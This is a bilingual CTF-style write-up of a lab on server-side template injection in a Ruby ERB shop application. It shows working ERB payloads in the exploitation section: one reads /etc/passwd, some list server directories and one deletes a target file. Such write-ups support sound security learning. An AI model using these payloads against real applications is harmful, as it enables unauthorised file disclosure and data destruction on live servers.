# Basic Server-Side Template Injection

Выберите язык / Choose your language:

- 🇷🇺 [Русский](WRITEUP.ru.md)  
- 🇬🇧 [English](WRITEUP.en.md)

## Disclaimer
---

**The text was written and translated by the author manually. A language model was used for formatting and stylistic editing.**

**This material is provided for educational and research purposes only. I do not encourage or call for unauthorized access to information systems or violation of the law. In my opinion, one of the most effective ways to combat cybercrime is to educate both everyday users and managers, as well as developers of digital products about common vulnerabilities that could potentially be exploited by malicious actors to carry out unlawful acts.**

**⚠️ All actions described in this document were performed within an authorized research environment (CTF/test platform), without violating the rights of third parties or current legislation.**

**Unauthorized interference with computer systems, violation of data storage and processing rules, and other forms of so-called "black-hat" hacking are contrary to law and the ethics of information security.**

**I adhere to the principles of ethical research and responsible vulnerability disclosure.**


## Target

![placeholder](images/lab1SSTIcard.png)

The instance seems to be a shop application with goofy items in stock:

![Lab](images/lab1SSTITarget.png)

## Functionality

The application behaves as a normal Portswigger shopping instance. What is unusual, is that one of the products is out of stock (It is always the first item):

![placeholder](images/lab1SSTIoutOfStock.png)

The message indicating a certain item is out of stock is being passed in the following way:

![placeholder](images/lab1SSTIoutOfStockRequest.png)

A possible entry for `SSTI (Server-Side Template Injection)`!
## Exploitation

The lab description strongly hints that the `ERB(Embedded Ruby)` template engine is being used to render such content. To test for `SSTI`, `ERB`-specific `SSTI` payloads can be passed along with the request, for instance:

``` Ruby
<%= 7 * 7 %>
```

It worked, the app rendered the result of the multiplication!

![placeholder](images/lab1SSTIpoc.png)

Modified `ERB` expressions can be utilized for various demonstrating different malicious actions For example:

List the contents of the `etc/passwd` file:

``` Ruby
<%= File.open("/etc/passwd").read %>
```

![placeholder](images/lab1SSTIetcPasswd.png)

Look around the server's content:

``` Ruby
<%= Dir.entries("/") %>
```

![placeholder](images/lab1SSTIdirContents.png)

And finally, complete the lab's main objective (discovering and deleting the `morale.txt` file):

``` Ruby
<%= Dir.entries("/home") %>
```

![placeholder](images/lab1SSTIdirHome.png)

``` Ruby
<%= File.delete("/home/carlos/morale.txt") %>
```

![placeholder](images/lab1SSTIdeleteMorale.png)

Another one bites the dust!

![placeholder](images/lab1SSTISuccess.png)

Thank you for you attention! ^^
